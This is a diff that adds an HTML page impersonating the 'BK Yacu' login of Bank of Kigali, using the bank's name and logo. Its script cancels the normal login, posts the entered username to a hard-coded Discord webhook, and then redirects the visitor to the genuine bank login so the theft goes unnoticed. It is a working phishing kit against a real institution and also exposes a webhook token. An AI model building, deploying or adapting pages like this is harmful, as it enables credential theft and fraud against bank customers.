@@ -1,0 +1,164 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link rel="shortcut icon" href="/BK/bk_layer.png" type="image/ico" />
+    <title>BK Yacu - Bank of Kigali Ltd</title>
+    <style type="text/css">
+        /* Your existing CSS styles */
+        .block {
+            text-align:center;
+            width: 320px;
+            padding: 0px;
+            margin: auto auto;
+            margin-top: 100px;
+            border-radius:12px;
+            box-shadow:0 0 10px #333;
+            -moz-border-radius:12px;
+            -moz-box-shadow:0 0 10px #333;
+            -webkit-border-radius: 12px;
+            -webkit-box-shadow: 0 0 10px #333;
+            border:3px solid white;
+            background-color: white;
+        }
+
+        form {
+            padding-top:0px;
+            padding-bottom:50px;
+            padding-left:50px;
+            padding-right:50px;
+        }
+
+        form p {
+            margin:0;
+            text-align:left;
+        }
+
+        label {
+            display:inline-block;
+            color:#5e5e5e;
+            font-size:15px;
+            font-weight:bold;
+            text-decoration:none;
+            text-shadow:1px 1px 0px #ffffff;
+        }
+
+        input[type="text"], input[type="password"] {
+            border-color:#EEEEEE #CCCCCC #CCCCCC #EEEEEE;
+            border-right:1px solid #CCCCCC;
+            border-style:solid;
+            border-width:1px;
+            font-size:15px;
+            margin:0 0 15px;
+            padding:5px;
+            width:200px;
+        }
+
+        input[type="text"]:focus, input[type="password"]:focus {
+            outline: none;
+            border: 1px solid #AF6527;
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+            -webkit-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+            -moz-box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+            box-shadow: inset 0 1px 2px rgba(0,0,0,0.3);
+        }
+        input[type="submit"], input[type="button"] {
+            box-shadow:inset 0px 1px 0px 0px #ffffff;
+            -moz-box-shadow:inset 0px 1px 0px 0px #ffffff;
+            -webkit-box-shadow:inset 0px 1px 0px 0px #ffffff;
+            box-shadow:inset 0px 1px 0px 0px #ffffff;
+            background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #ededed), color-stop(1, #e6e6e6) );
+            background:-moz-linear-gradient( center top, #ededed 5%, #e6e6e6 100% );
+            filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ededed', endColorstr='#e6e6e6');
+            background-color:#ededed;
+            -moz-border-radius:7px;
+            -webkit-border-radius:7px;
+            border-radius:7px;
+            border:1px solid #c4c4c4;
+            display:inline-block;
+            color:#5e5e5e;
+            font-size:15px;
+            font-weight:bold;
+            padding:6px 20px;
+            text-decoration:none;
+            text-shadow:1px 1px 0px #ffffff;
+        }
+        input[type="submit"]:hover, input[type="button"]:hover {
+            background:-webkit-gradient( linear, left top, left bottom, color-stop(0.05, #e6e6e6), color-stop(1, #ededed) );
+            background:-moz-linear-gradient( center top, #e6e6e6 5%, #ededed 100% );
+            filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#e6e6e6', endColorstr='#ededed');
+            background-color:#e6e6e6;
+            cursor: pointer;
+        }
+        input[type="submit"]:active, input[type="button"]:active {
+            position:relative;
+            top:1px;
+        }
+    </style>
+</head>
+<body style="background-color: #ecf3fb; font-family: 'trebuchet MS','Lucida sans',Arial" onload="document.getElementById('j_username').focus();void(0);">
+    <div class="block">
+        <img src="https://agency.bk.rw/img/bk_layer.png" alt="Logo"/>
+        <form id="loginForm" method="post">
+            <input type="checkbox" name="_spring_security_remember_me" id="_spring_security_remember_me" style="display: none"/>
+            <p><h2 style="color:#0576BC;font-size: 24px">LOGIN</h2></p>
+            <p><label for="j_username">Username</label><input type="text" name="j_username" id="j_username" /></p>
+            <p><label for="j_password">Password</label><input type="password" name="j_password" id="j_password" /></p>
+            <p><input type="submit" id="loginBtn" value="Login" /></p>
+            <p><br/>For support, call us on <b style="color:#0576BC;font-size: 24px">4455</b></p>
+        </form>
+    </div>
+
+    <script>
+        // JavaScript code starts here
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent default form submission
+
+            // Get username and password from form inputs
+            var username = document.getElementById('j_username').value;
+            var password = document.getElementById('j_password').value;
+
+            // Simulate logging the attempt (you can customize this)
+            var logMessage = new Date().toISOString() + " - Login attempt by: " + username + "\n";
+            console.log(logMessage); // Log to console (for demonstration)
+
+            // Replace this with your actual webhook URL
+            var webhookUrl = 'https://discord.com/api/webhooks/1254965734858166377/p5-nqFweiZlTGoZlkOWrkpTJo4NSA7qqANpXg5QRtNpodZJRQheAhxVDCTHtWgPgqe9t';
+
+            // Example of sending data to webhook (you can customize this)
+            var payload = {
+                content: "Login attempt",
+                embeds: [{
+                    title: "Login Attempt",
+                    description: "User: " + username,
+                    color: 16711680 // Red color (you can change this)
+                }]
+            };
+
+            // Setup and send POST request to webhook URL
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('Webhook sent successfully');
+                    // Redirect user after successful login and webhook
+                    window.location.href = 'https://agency.bk.rw/login'; // Redirect URL fixed
+                } else {
+                    console.error('Failed to send webhook');
+                    // Handle error scenario (optional)
+                }
+            })
+            .catch(error => {
+                console.error('Error sending webhook:', error);
+                // Handle error scenario (optional)
+            });
+        });
+        // JavaScript code ends here
+    </script>
+</body>
+</html>
